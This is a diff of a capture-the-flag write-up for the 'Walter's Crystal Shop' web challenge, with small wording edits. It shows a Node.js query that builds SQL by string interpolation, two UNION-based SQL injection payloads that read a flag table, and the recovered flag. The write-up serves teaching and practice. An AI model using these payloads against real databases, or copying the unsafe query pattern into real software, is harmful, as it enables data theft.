@@ -3,7 +3,7 @@
 > My buddy Walter is selling some crystals, check out his shop!
 
 ## About the Challenge
-We were given a website and source code (You can download the source code [here](walters_crystal_shop.zip)). Searching a crystal name is the only functionality of the website
+We were given a website and source code (You can download the source code [here](walters_crystal_shop.zip)). Searching a crystal name is the only functionality of the website.
 
 ![Alt text](images/image.png)
 
@@ -34,15 +34,15 @@ app.get("/crystals", (req, res) => {
   });
 });
 ```
-Focusing on the databse query
+Focusing on the database query
 ```sql
 SELECT * FROM crystals WHERE name LIKE '%${name}%'
 ```
-If we use the website's search bar and enter `h` the query will be like this
+And entering `h` in the website's search bar, the query will be like this
 ```sql
 SELECT * FROM crystals WHERE name LIKE '%$h%'
 ```
-With knowledge in SQLite documentation, to unite tables with different columns we must have same column name as the one with greater columns. We can enter the search bar with
+With knowledge in SQLite documentation, uniting tables with different columns must have same column name as the one with greater columns. We can enter the search bar with
 ```
 %' UNION SELECT flag as name, Null as price, Null as quantity FROM flag WHERE flag LIKE '%ctf
 ```
@@ -55,7 +55,7 @@ SELECT * FROM crystals WHERE name LIKE '%%' UNION SELECT flag as name, Null as p
 nbctf{h0p3fuLLy_7h3_D3A_d035n7_kn0w_ab0ut_th3_0th3r_cRyst4l5}
 ```
 ## Alternative Solution
-Using SQL Injection Payload
+Using SQL Injection Payload in search query
 ```
 ' union select (select * from flag),2,3-- -
 ```
